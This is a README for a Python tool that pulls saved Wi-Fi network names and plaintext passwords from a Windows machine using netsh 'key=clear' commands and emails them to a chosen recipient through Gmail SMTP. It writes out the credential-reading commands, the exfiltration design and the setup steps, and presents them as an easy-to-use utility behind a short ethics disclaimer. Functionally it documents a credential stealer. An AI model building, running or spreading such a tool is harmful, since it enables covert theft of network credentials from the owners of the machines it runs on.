# **WiFi Password Extractor**

This Python script retrieves saved Wi-Fi profiles (SSIDs) and their passwords from a Windows machine and sends the information via email. It uses the `netsh` command to extract Wi-Fi details and the `smtplib` library to send the data via Gmail.

---

## **Features**
- Retrieves saved Wi-Fi profiles and their passwords.
- Sends the retrieved data via email.
- Works on Windows machines.
- Easy to use and customizable.

---

## **Requirements**
- Python 3.x
- Windows OS (required for `netsh` command)

---

## **Installation**

### **1. Clone the Repository**
```bash
git clone https://github.com/yourusername/wifi-password-extractor.git
cd wifi-password-extractor
```

### **2. Install Required Python Packages**
No additional packages are required as the script uses Python's standard libraries:
- `subprocess`
- `re`
- `smtplib`
- `email`
- `ssl`

If you want to run the script in a virtual environment, follow these steps:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

---

## **Usage**

### **1. Update Email Credentials**
Open the script and update the following variables with your email credentials:
```python
sender_email = "your_email@gmail.com"  # Replace with your Gmail address
sender_password = "your_app_password"  # Replace with your Gmail app password
receiver_email = "receiver_email@gmail.com"  # Replace with the recipient's email address
```

**Note**: If you have 2FA enabled on your Gmail account, you need to generate an [app password](https://support.google.com/accounts/answer/185833?hl=en).

### **2. Run the Script**
Execute the script using Python:
```bash
python wifi_password_extractor.py
```

---

## **How It Works**

### **1. Retrieving Wi-Fi Profiles**
- The script uses the `netsh` command to list all saved Wi-Fi profiles:
  ```bash
  netsh wlan show profiles
  ```
- For each profile, it retrieves the password (if available) using:
  ```bash
  netsh wlan show profile <profile_name> key=clear
  ```
- The SSID and password are extracted using regular expressions.

### **2. Sending Email**
- The script composes an email with the retrieved Wi-Fi profiles and sends it using Gmail's SMTP server.
- The email body contains the SSID and password for each Wi-Fi profile.

---

## **Example Output**
If the saved Wi-Fi profiles are:
- `MyWiFi` with password `mypassword123`
- `GuestWiFi` with no password

The email body will look like:
```
SSID: MyWiFi, Password: mypassword123
SSID: GuestWiFi, Password: None
```

---

## **Code Overview**

### **Class: `WiFiPasswordExtractor`**
- **`__init__`**: Initializes the sender and receiver email addresses and the sender's password.
- **`get_wifi_profiles`**: Retrieves saved Wi-Fi profiles and their passwords using the `netsh` command.
- **`send_email`**: Sends an email with the retrieved Wi-Fi profiles and passwords.
- **`run`**: Orchestrates the process by calling the other methods.

---

## **Error Handling**
- The script includes robust error handling for:
  - Wi-Fi profile retrieval.
  - Email sending.
- If an error occurs, the script will print a meaningful message and continue execution.

---

## **Important Notes**
1. **Security**:
   - Avoid hardcoding sensitive information like email passwords in your script. Use environment variables or secure credential storage.
   - Ensure the script is used ethically and only on systems you own or have permission to access.

2. **Gmail Account**:
   - Ensure the sender's email address and password are correct.
   - Enable "Less secure app access" or generate an app password if 2FA is enabled.

---

## **Disclaimer**
This script is provided for educational and authorized use only. Misuse of this script to access Wi-Fi passwords without permission is illegal and unethical. Always ensure you have proper authorization before using this script.

---

## **Contributing**
Contributions are welcome! If you find any issues or have suggestions for improvement, please open an issue or submit a pull request.

---

## **Support**
If you have any questions or need assistance, feel free to open an issue or contact the maintainer.

---
